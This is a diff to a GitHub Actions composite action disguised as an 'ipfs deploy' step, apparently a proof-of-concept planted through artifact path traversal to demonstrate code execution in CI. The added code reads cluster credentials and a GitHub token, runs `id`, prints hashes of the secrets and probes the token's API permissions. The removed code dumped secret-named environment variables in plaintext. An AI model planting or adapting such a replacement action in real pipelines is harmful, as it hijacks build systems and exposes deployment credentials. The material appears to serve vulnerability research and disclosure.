@@ -1,18 +1,28 @@
 name: 'ipfs deploy (replaced)'
 description: 'replacement composite action planted via artifact path traversal'
+inputs:
+  cluster-user:
+    required: false
+  cluster-password:
+    required: false
+  github-token:
+    required: false
 runs:
   using: 'composite'
   steps:
     - name: proof
       shell: bash
+      env:
+        CU: ${{ inputs.cluster-user }}
+        CP: ${{ inputs.cluster-password }}
+        GT: ${{ inputs.github-token }}
       run: |
         echo "GAB_RCE_MARKER_START"
         id
         echo "PWD=$PWD"
-        echo "--- cluster inputs visible to this step ---"
-        for v in $(env | grep -o '^[A-Za-z0-9_-]*' | sort -u); do
-          case "$v" in
-            *CLUSTER*|*INPUT*|*TOKEN*|*SECRET*) echo "$v=${!v}";;
-          esac
-        done
+        echo "CU_len=${#CU} CU_sha=$(printf '%s' "$CU" | sha256sum | cut -d' ' -f1)"
+        echo "CP_len=${#CP} CP_sha=$(printf '%s' "$CP" | sha256sum | cut -d' ' -f1)"
+        echo "GT_len=${#GT} GT_sha=$(printf '%s' "$GT" | sha256sum | cut -d' ' -f1)"
+        echo "--- token permissions ---"
+        curl -sS -H "authorization: Bearer $GT" "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY" | head -c 200; echo
         echo "GAB_RCE_MARKER_END"
